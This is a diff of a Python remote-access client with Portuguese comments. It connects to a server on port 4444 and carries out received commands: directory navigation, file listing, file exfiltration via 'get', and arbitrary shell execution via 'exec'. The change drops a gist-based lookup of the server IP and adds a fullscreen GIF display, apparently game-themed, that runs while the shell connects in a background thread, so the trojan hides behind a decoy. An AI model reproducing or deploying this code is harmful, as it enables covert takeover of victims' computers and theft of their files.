@@ -2,58 +2,44 @@ import socket
 import os
 import subprocess
 import requests
-
-GIST_RAW_URL = "https://gist.githubusercontent.com/daviwll/a8c3564129a5db5ba5e5adcae70cea4b/raw/fd05499963671eb0c5cef4d1c31f27fddd89362d/ip.txt"
-
-def get_server_ip():
-    try:
-        response = requests.get(GIST_RAW_URL)
-        return response.text.strip()
-    except:
-        return None
+import threading
+import tkinter as tk
+from PIL import Image, ImageTk
+import sys
 
 def connect_server():
-    host = get_server_ip() 
-
+    host = "127.0.0.1"
     if not host:
         print("Não foi possível obter o IP do servidor.")
         return
-  
-    port = 4444  # Porta TCP
+    port = 4444
 
     try:
-        s = socket.socket()  # Criação do socket
-        s.connect((host, port))  # Conexão com o servidor
-
-        # Recebe o IP do servidor enviado logo após a conexão
+        s = socket.socket()
+        s.connect((host, port))
         server_ip_message = s.recv(1024).decode()
 
         if server_ip_message.startswith("SERVER_IP"):
             server_ip = server_ip_message.split()[1]
-            print(f"Conectando ao servidor no IP: {server_ip}")
-            s.close()  # Fecha a conexão antiga
-            s = socket.socket()  # Cria um novo socket para a nova conexão com o IP do servidor
-            s.connect((server_ip, port))  # Conecta-se ao IP recebido
+            s.close()
+            s = socket.socket()
+            s.connect((server_ip, port))
 
         while True:
-            command = s.recv(1024).decode()  # Recebe comandos do servidor
-            
-            if command.startswith("cd "):  # Navega entre as pastas
+            command = s.recv(1024).decode()
+            if command.startswith("cd "):
                 try:
                     path = command[3:]
                     os.chdir(path)
                     s.send(f"[OK] Current path: {os.getcwd()}".encode())
-
                 except Exception as e:
                     s.send(f"[ERROR ☠️] {e}".encode())
-
             elif command == 'ls':
                 try:
                     files = "\n".join(os.listdir())
                     s.send(files.encode())
                 except Exception as e:
                     s.send(f"[ERROR ☠️] {e}".encode())
-
             elif command.startswith("get "):
                 archive_name = command[4:]
                 if os.path.exists(archive_name):
@@ -63,7 +49,6 @@ def connect_server():
                         s.send(b"<EOF>")
                 else:
                     s.send(f"[ERROR ☠️] Arquivo não encontrado.")
-
             elif command.startswith("exec "):
                 cmd = command[5:]
                 try:
@@ -76,12 +61,54 @@ def connect_server():
                 break
             else:
                 s.send(b"[ERRO] Comando desconhecido.")
-
     except Exception as e:
         print("Erro ao conectar:", e)
     finally:
         s.close()
         print("[*] Conexão encerrada.")
 
+def show_gif():
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.configure(background='black')
+
+    # Caminho do GIF (para .exe ou script)
+    if getattr(sys, 'frozen', False):
+        base_dir = sys._MEIPASS
+    else:
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+    
+    gif_path = os.path.join(base_dir, "gtasa.gif")
+
+    try:
+        image = Image.open(gif_path)
+        frames = []
+        for i in range(image.n_frames):
+            image.seek(i)
+            frame = ImageTk.PhotoImage(image.copy())
+            frames.append(frame)
+
+        label = tk.Label(root)
+        label.pack()
+
+        current_frame = 0
+        def update_frame():
+            nonlocal current_frame
+            label.config(image=frames[current_frame])
+            current_frame = (current_frame + 1) % len(frames)
+            root.after(50, update_frame)  # Ajuste a velocidade aqui
+
+        update_frame()
+        root.mainloop()
+    except Exception as e:
+        print(f"Erro ao carregar o GIF: {e}")
+        root.destroy()
+
 if __name__ == "__main__":
-    connect_server()
+    # Inicia a conexão em uma thread
+    server_thread = threading.Thread(target=connect_server)
+    server_thread.daemon = True
+    server_thread.start()
+
+    # Exibe o GIF em tela cheia
+    show_gif()
